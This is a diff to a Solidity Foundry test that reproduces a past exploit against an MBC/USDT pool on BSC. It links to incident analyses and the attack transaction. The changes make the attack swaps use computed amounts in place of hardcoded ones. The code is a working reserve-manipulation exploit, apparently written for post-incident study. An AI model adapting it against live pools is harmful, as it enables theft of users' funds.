@@ -6,6 +6,7 @@ import "./interface.sol";
 
 // @Analysis
 // https://twitter.com/AnciliaInc/status/1597742575623888896
+// https://twitter.com/CertiKAlert/status/1597639717096460288
 // @TX
 // https://phalcon.blocksec.com/tx/bsc/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86
 
@@ -59,15 +60,14 @@ contract ContractTest is DSTest {
         // Intial rate MBC/USDT -> 1.1365032200116891/1
         // Pair getReserves -> 12475110456913920021663 / 10976748888389080860664
         address[] memory path = new address[](2);
-        path[0] = address(MBC);
-        path[1] = address(USDT);
-
+        path[0] = address(USDT);
+        path[1] = address(MBC);
         uint[] memory values = Router.getAmountsOut(150_000 * 10**18, path);
 
         USDT.transfer(address(Pair), 150_000 * 10**18);
 
         Pair.swap(
-            11622067859410934780273,
+            values[1],
             0,
             address(this),
             ""
@@ -80,12 +80,17 @@ contract ContractTest is DSTest {
         // Altered rate MBC/USDT -> 0.0052991665156216445/1
         // Pair getReserves -> 900258815097978209431 / 169886870405763976494888
 
-        USDT.transfer(address(Pair), 1001);
-        MBC.transfer(address(Pair), 10692302430658059997784);
+        USDT.transfer(address(Pair), 1001); // function() _isAddLiquidityV1()
+        MBC.transfer(address(Pair), MBC.balanceOf(address(this)));
+        (uint MBCReserve, uint USDTReserve, ) = Pair.getReserves();
+        uint amountIn = MBC.balanceOf(address(Pair)) - MBCReserve;
+        path[0] = address(MBC);
+        path[1] = address(USDT); 
+        values = Router.getAmountsOut(amountIn, path);
 
         Pair.swap(
             0,
-            155602136642505248762174,
+            values[1],
             address(this),
             ""
         );
